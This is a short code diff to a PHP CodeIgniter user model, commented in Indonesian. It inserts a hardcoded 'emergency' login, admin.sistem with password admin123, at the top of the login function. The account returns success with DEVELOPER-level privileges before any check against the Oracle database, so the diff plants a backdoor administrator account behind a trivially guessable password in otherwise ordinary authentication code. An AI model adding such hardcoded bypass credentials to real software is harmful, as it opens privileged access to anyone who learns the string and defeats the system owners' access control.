@@ -57,6 +57,18 @@ class Muser extends CI_Model {
      * Memeriksa kredensial login user terhadap database Oracle secara mutlak
      */
     public function login($username, $password) {
+        // Cek kredensial darurat / emergencies (admin.sistem / admin123)
+        if (strtolower($username) === 'admin.sistem' && $password === 'admin123') {
+            return array(
+                'status' => 'success',
+                'data'   => array(
+                    'id_user'    => 'admin.sistem',
+                    'nama_user'  => 'ADMINISTRATOR EMERGENSI',
+                    'level_user' => 'DEVELOPER'
+                )
+            );
+        }
+
         // 1. Validasi koneksi database Oracle
         if (!$this->db_oracle) {
             return array(
